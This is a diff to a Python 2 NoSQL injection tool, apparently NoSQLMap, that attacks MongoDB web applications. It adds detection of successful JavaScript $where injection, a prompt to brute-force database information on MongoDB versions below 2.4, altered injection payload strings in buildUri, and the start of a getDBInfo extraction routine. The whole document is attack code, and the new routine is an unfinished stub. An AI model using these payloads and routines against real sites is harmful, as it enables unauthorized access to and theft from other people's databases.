@@ -408,6 +408,7 @@ def webApps():
 	intTbAttack = False
 	trueStr = False
 	trueInt = False
+	lt24 = False
 	
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -483,6 +484,8 @@ def webApps():
 		
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
 			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
+			lt24 = True
+			str24 = True
 			vulnAddrs.append(uriArray[2])
 		
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
@@ -505,6 +508,8 @@ def webApps():
 		
 		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+			lt24 = True
+			int24 = True
 			vulnAddrs.append(uriArray[3])
 			
 		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
@@ -529,6 +534,8 @@ def webApps():
 			
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
+			lt24 = True
+			str24 = True
 			vulnAddrs.append(uriArray[4])
 		
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
@@ -552,6 +559,8 @@ def webApps():
 			
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			lt24 = True
+			int24 = True
 			vulnAddrs.append(uriArray[5])
 		
 		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
@@ -648,6 +657,13 @@ def webApps():
 			else:
 				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
 				intTbAttack = False
+		
+		if lt24 == True:
+			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
+			
+			if bfInfo == "y" or bfInfo == "Y":
+				getDBInfo()
+				
 		
 		print "\n"	
 		print "Vunerable URLs:"
@@ -816,7 +832,7 @@ def buildUri(origUri, randValue):
 			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
 			uriArray[15] += paramName[x] + "1; return true; var dum=2"
 			#Add values that can be manipulated for database attacks
-			uriArray[16] += paramName[x] + "=a'; if ---"
+			uriArray[16] += paramName[x] + "=a\"; if ---"
 			uriArray[17] += paramName[x] + "=1; if ---"
 
 		else:
@@ -1016,4 +1032,10 @@ def brute_pass(user,key):
 	print "Password not found for "+user
 	return ""
 
+def getDBInfo():
+	print "Getting baseline True query return size..."
+	trueUri = uriArray[17].replace("---","a\'; return True; var dummy ='!")
+	
+	print "Calculating DB name length..."
+	
 mainMenu()
